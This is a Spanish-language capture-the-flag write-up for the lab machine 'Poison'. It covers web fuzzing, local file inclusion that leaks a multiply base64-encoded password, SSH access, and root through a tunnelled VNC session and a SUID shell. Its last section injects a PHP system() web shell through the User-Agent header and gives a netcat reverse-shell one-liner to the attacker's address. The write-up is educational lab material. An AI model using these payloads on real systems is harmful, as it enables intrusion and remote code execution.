# 10.10.10.84 - Poison

![Poison](https://user-images.githubusercontent.com/96772264/208063894-e3532ed5-125a-4732-85f6-e146f6e6ad53.png)

----------------------
# Part 1: Enumeración

Puertos abiertos 22(ssh), 80(http):
```console
└─$ whatweb http://10.10.10.84
Apache[2.4.29], [PHP/5.6.32]
```
Como tenemos php, podeos hacer tres tipos de fuzzing:
- Por directorios: ```wfuzz --hc=404 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u "http://10.10.10.84/FUZZ/" -t 200```  
- Por subdominios: ```wfuzz -c --hh=289 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.10.10.10.84.htb" -u http://10.10.10.84/ -t 100```  
- Por extensiones php: ```wfuzz --hc=404 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u "http://10.10.10.84/FUZZ.php" -t 200```  

Solo conseguimos rutas con las extensiones: index.php, browse.php, info.php y el famoso phpinfo.php  

-------------
# Part 2: LFI

En la web nos dicen que nos pueden mostrar archivos php locales como "ini.php, info.php, listfiles.php, phpinfo.php". Es decir nos están mostrando claramente parte
de la máquina, es decir un LocalFileInclusion. Se pasa el archivo por /GET a browse.php con el parámetro file.  
![poison2](https://user-images.githubusercontent.com/96772264/208064379-bcd4cbfa-28e2-442d-9878-4a42da436f15.PNG)

Si nos muestran un archivo php sin que se interprete lo estará pasando por el wrapper ```php://filter/convert.base64-encode/resource=shell.php``` y luego haciendole un
```base64 -d```

- **Info.php**: Dice que el sistema es un FreeBSD Poison 11.1-RELEASE.  
- **listfiles.php**: array con los archivos anres mencionados mas "pwdbackup.txt"  
- **browse.php**: da error por ser el propio archivo.  
- **test**: el error a drede nos da la ruta "usr/local/www/apache24/data/"  
- **ini.php**: archivo que muestra un array con programas...  

![poison1](https://user-images.githubusercontent.com/96772264/208064390-ca756d10-9807-4166-9cc8-f2c009e67a8a.PNG)

### PWDbackup

Al abrir "pwdbackup.txt" nos dicen que es una contraseña codificada en base64 muchas veces.  

```console
# ELiminar la primera liena dejando solo el texto en base64, luego:
└─$ cat pwdbackup.txt | tr -d "\n" | base64 -d | base64 -d | base64 -d | base64 -d | base64 -d | base64 -d | base64 -d | base64 -d | base64 -d| base64 -d | base64 -d | base64 -d | base64 -d
Charix!2#4%6&8(0
```

### Ini.php  
```console
└─$ cat ini.php | grep -oE "    \[.*?\]" | sort -u  
```
- [sendmail_path] => Array : /usr/sbin/sendmail -t -i # un programa?  
- [extension_dir] => Array : /usr/local/lib/php/20131226  
  
```└─$ curl -s -X GET 'http://10.10.10.84/browse.php?file=../../../../../usr/sbin/sendmail' -O sendamail```  

Conseguimos dicho binario pero al hacerle ```chmod +x``` sigue sin funcionar.  


## EtcPasswd
```
└─$ curl -s -X GET 'http://10.10.10.84/browse.php?file=/etc/passwd' | grep "sh$"  
# Usuarios -> charix y root  
```
Probamos otras rutas típicas como **/proc/net/tcp** pero no existen  

-------------
# Part 3: Accediendo al sistema

```console
└─$ sshpass -p 'Charix!2#4%6&8(0' ssh charix@10.10.10.84 
charix@Poison:~ %
```
El sistema es muy pequeño, apenas hay programas, asi que en la enumeración encontramos pocas cosas como:  

- secret.zip  
- /var/mail/charix # no hay nada y en el resto de /var/mail no puedo acceder.  
- /home/charix/.mail_aliases  
- /home/charix/.mailrc  
- /home/charix/.login_conf  

Nada interesante. 
```console
charix@Poison:~ % nc 10.10.14.16 443 < secret.zip
└─$ sudo nc -nlvp 443 > secret.zip
└─$ 7z x secret.zip # password Charix!2#4%6&8(0 
└─$ cat secret  #  ��[|Ֆz! ??
```
En este tipo de sistemas netstat funciona de manera diferente (cuando lo corrimos con mi script ```netstat -nat```) nos mostraban las opciones.

-------------
# Part 4: VNCviewer

```console
charix@Poison:~ % netstat -na -p tcp
tcp4       0      0 127.0.0.1.5801         *.*                    LISTEN
tcp4       0      0 127.0.0.1.5901         *.*                    LISTEN
```
Si buscamos estos puertos en google relativos a freebsd nos dice que funciona el "VNC client":  

```console
charix@Poison:/tmp % ps aux | grep "vnc"
root   529   0.0  0.9  23620  8872 v0- I    18:54    0:00.02 Xvnc :1 -desktop X -httpd /usr/local/share/tightvnc/classes -auth /root/.Xauthority -geometry 1280x800 -depth 24 -rfbwait 120000 -rfbauth /root/.vnc/passwd -rfbport 5901 -localhost -nolisten tcp :1
```

El asunto esque corre por la máquina local, así que hay que traerse esos puertos.  

```console
└─$ sshpass -p 'Charix!2#4%6&8(0' ssh charix@10.10.10.84 -D 666
└─$  sudo nano /etc/proxychains4.conf
socks4  127.0.0.1 666
```
Una vez hecho el tunel, se accedería por él a dicho puerto (que ahora parece del localhost). Como contraseña le adjuntamos el archivo binario raro de antes "secret"
```
└─$ proxychains vncviewer 127.0.0.1:5901 -passwd secret
```
![poison3](https://user-images.githubusercontent.com/96772264/208064498-5cd2a774-3e39-4198-84da-706af9a2fa4e.PNG)

Lo que nos abre una ventana de acceso al sistema como root. Como no podemos copiar cosas ni nada, pero somos root, lo ideal es hacer SUID a la sh 
```chmod  u+s /bin/sh``` y en el sistema al que entramos por ssh  ```sh -p``` y ya tenemos una consola como root.


---------------
# Extra: Log Poisoning

Tenemos un LFI, que nos permite ver archivos, pero se puede convertir en un RCE por una técnica llamada Log 
poisoning. 
 
- /var/log/auth.log -> ssh   
- /var/log/mail -> smtp    
- /var/log/apache2/acces.log -> apache    
- /var/log/httpd-access.log -> apache tambien  

```console
└─$ curl -s -X GET -H $'User-Agent: <?php system($_GET[\'cmd\']); ?>' 'http://10.10.10.84/browse.php?file=/var/log/httpd-access.log'
└─$ curl -s -X GET 'http://10.10.10.84/browse.php?file=/var/log/httpd-access.log&cmd=whoami'
10.10.14.16 - - [15/Dec/2022:19:51:05 +0100] "GET /browse.php?file=/var/log/httpd-access.log HTTP/1.1" 200 1067 "-" "www"
```
Si ponemos en el navegador:   ```rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>%261|nc 10.10.14.16 443 >/tmp/f```
